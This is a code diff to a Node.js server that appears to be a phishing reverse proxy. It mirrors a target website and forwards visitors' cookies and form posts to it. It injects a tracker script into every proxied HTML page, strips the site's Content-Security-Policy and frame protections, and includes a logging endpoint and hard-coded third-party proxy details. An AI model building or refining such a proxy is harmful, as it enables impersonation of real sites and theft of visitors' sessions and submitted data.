@@ -21,7 +21,7 @@ const TARGET_SITE = process.env.TARGET_SITE || 'https://example.com';
 
 // Прокси настройки - можно менять прямо тут
 const PROXY_CONFIG = {
-  enabled: true, // true - включить, false - выключить
+  enabled: false, // ВЫКЛЮЧЕН - включи когда найдёшь рабочий формат
   ip: '77.83.186.142',
   port: '8000',
   username: 'UnXGJU',
@@ -235,71 +235,116 @@ app.post('/api/log', async (req, res) => {
   }
 });
 
-// Прокси через Puppeteer
+// Прокси через обычный HTTP (быстрее и капча работает)
 app.get('*', async (req, res) => {
   const url = TARGET_SITE + req.path + (req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '');
-  console.log('Fetching with Puppeteer:', url);
+  console.log('Fetching:', url);
   
-  let page = null;
   try {
-    const br = await getBrowser();
-    page = await br.newPage();
+    const https = require('https');
+    const http = require('http');
+    const urlModule = require('url');
     
-    page.setDefaultTimeout(30000);
-    page.setDefaultNavigationTimeout(30000);
+    const parsedUrl = urlModule.parse(url);
+    const protocol = parsedUrl.protocol === 'https:' ? https : http;
     
-    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
-    await page.setViewport({ width: 1920, height: 1080 });
-    
-    // Перехватываем все запросы для логирования
-    await page.setRequestInterception(false);
-    
-    // Быстрая загрузка
-    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 });
-    
-    // Минимальная задержка
-    await page.waitForTimeout(1500);
-    
-    let html = await page.content();
-    
-    // Добавляем base tag для всех страниц
-    const baseUrl = new URL(TARGET_SITE);
-    if (html.includes('<head>')) {
-      html = html.replace('<head>', `<head>\n<base href="${baseUrl.origin}/">`);
-    }
-    
-    // Проверяем Cloudflare
-    const isCloudflare = html.includes('cf-challenge') || 
-                         html.includes('Just a moment') || 
-                         html.includes('Verify you are human');
-    
-    // Внедряем трекер только если НЕ Cloudflare
-    if (!isCloudflare) {
-      if (html.includes('</body>')) {
-        html = html.replace('</body>', trackerScript + '</body>');
-      } else {
-        html += trackerScript;
+    const options = {
+      hostname: parsedUrl.hostname,
+      port: parsedUrl.port,
+      path: parsedUrl.path,
+      method: req.method,
+      headers: {
+        'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Accept': req.headers.accept || 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1'
       }
+    };
+    
+    // Передаём cookies если есть
+    if (req.headers.cookie) {
+      options.headers['Cookie'] = req.headers.cookie;
     }
     
-    // Важные заголовки для работы Cloudflare
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('X-Frame-Options', 'ALLOWALL');
-    res.removeHeader('Content-Security-Policy');
-    res.removeHeader('X-Content-Security-Policy');
+    const proxyReq = protocol.request(options, (proxyRes) => {
+      // Собираем данные
+      let data = [];
+      
+      proxyRes.on('data', (chunk) => {
+        data.push(chunk);
+      });
+      
+      proxyRes.on('end', () => {
+        let body = Buffer.concat(data);
+        
+        // Если это HTML - обрабатываем
+        const contentType = proxyRes.headers['content-type'] || '';
+        if (contentType.includes('text/html')) {
+          let html = body.toString('utf-8');
+          
+          // Добавляем base tag
+          const baseUrl = new URL(TARGET_SITE);
+          if (html.includes('<head>')) {
+            html = html.replace('<head>', `<head>\n<base href="${baseUrl.origin}/">`);
+          }
+          
+          // Проверяем Cloudflare
+          const isCloudflare = html.includes('cf-challenge') || 
+                               html.includes('Just a moment') || 
+                               html.includes('Verify you are human');
+          
+          // Внедряем трекер только если НЕ Cloudflare
+          if (!isCloudflare) {
+            if (html.includes('</body>')) {
+              html = html.replace('</body>', trackerScript + '</body>');
+            } else {
+              html += trackerScript;
+            }
+          }
+          
+          body = Buffer.from(html, 'utf-8');
+          
+          // Обновляем Content-Length
+          proxyRes.headers['content-length'] = body.length;
+        }
+        
+        // Убираем проблемные заголовки
+        delete proxyRes.headers['content-security-policy'];
+        delete proxyRes.headers['x-frame-options'];
+        
+        // Отправляем ответ
+        res.writeHead(proxyRes.statusCode, proxyRes.headers);
+        res.end(body);
+      });
+    });
     
-    res.send(html);
+    proxyReq.on('error', (err) => {
+      console.error('Proxy error:', err);
+      res.status(500).send(`
+        <html><body style="font-family:sans-serif;padding:20px;">
+          <h2>❌ Ошибка загрузки</h2>
+          <p>${err.message}</p>
+        </body></html>
+      `);
+    });
+    
+    // Передаём тело запроса если POST
+    if (req.method === 'POST' || req.method === 'PUT') {
+      req.pipe(proxyReq);
+    } else {
+      proxyReq.end();
+    }
+    
   } catch (err) {
-    console.error('Puppeteer error:', err.message);
+    console.error('Error:', err.message);
     res.status(500).send(`
       <html><body style="font-family:sans-serif;padding:20px;">
-        <h2>❌ Ошибка загрузки</h2>
+        <h2>❌ Ошибка</h2>
         <p>${err.message}</p>
       </body></html>
     `);
-  } finally {
-    if (page) await page.close().catch(() => {});
   }
 });
 
